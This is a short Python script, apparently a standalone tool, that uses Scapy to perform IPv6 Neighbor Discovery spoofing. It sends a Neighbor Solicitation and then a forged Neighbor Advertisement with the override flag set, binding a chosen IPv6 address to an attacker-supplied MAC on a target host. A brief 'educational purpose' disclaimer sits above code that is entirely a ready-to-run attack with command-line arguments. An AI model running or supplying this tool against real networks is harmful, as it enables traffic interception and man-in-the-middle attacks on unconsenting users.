########################################################################################
##                                                                                    ##
##    This Python Script about IPv6 Neighbor Advertisement attack                     ##
##    Author: MAhmutAY   < mahmutayy@yahoo.com >                                      ##
##                                                                                    ##
##       This is only educational purpose  or bussiness usage                         ##
##  !!  Do not attempt to violate the laws with anything contained here. !!!          ##
##                                                                                    ##                                                              
########################################################################################

from scapy.all import Ether, IPv6, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, sendp
import argparse


def send_ns(target_ip, target_mac, spoofed_ip, interface):
    ether = Ether(dst=target_mac)
    ipv6 = IPv6(dst=target_ip)
    icmp = ICMPv6ND_NS(tgt=spoofed_ip)
    ns_packet = ether / ipv6 / icmp
    sendp(ns_packet, iface=interface)

def send_na(target_ip, target_mac, spoofed_ip, spoofed_mac, interface):
    ether = Ether(dst=target_mac)
    ipv6 = IPv6(dst=target_ip)
    icmp = ICMPv6ND_NA(tgt=spoofed_ip, R=1, S=1, O=1) / ICMPv6NDOptDstLLAddr(lladdr=spoofed_mac)
    na_packet = ether / ipv6 / icmp
    sendp(na_packet, iface=interface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IPv6 Neighbor Solicitation/Advertisement Spoofing Script By MahmutAY")
    parser.add_argument("target_ip", help="The IPv6 address of the target machine")
    parser.add_argument("target_mac", help="The MAC address of the target machine")
    parser.add_argument("spoofed_ip", help="The IPv6 address you want to spoof")
    parser.add_argument("spoofed_mac", help="The MAC address you want to associate with the spoofed IP")
    parser.add_argument("interface", help="choose the network interface to use")

    args = parser.parse_args()

    print("Sending Neighbor Solicitation packet...!!")
    send_ns(args.target_ip, args.target_mac, args.spoofed_ip, args.interface)

    print("Sending Neighbor Advertisement packet...!!")
    send_na(args.target_ip, args.target_mac, args.spoofed_ip, args.spoofed_mac, args.interface)
